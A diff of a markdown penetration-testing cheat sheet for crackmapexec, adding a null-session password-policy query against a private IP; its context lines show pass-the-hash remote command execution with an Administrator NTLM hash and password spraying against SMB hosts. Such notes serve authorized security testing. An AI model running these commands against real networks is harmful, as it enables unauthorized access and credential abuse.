@@ -18,3 +18,9 @@ crackmapexec smb <HOST.lst> -d domain.com -u Administrator -H <NTLM HASH> -x 'wh
 crackmapexec smb <TARGET_IP> -u <user.lst> -p <pass.list>
 ```
 
+### Password policy
+
+```csharp
+crackmapexec smb 10.110.0.222 --pass-pol -u '' -p ''
+```
+
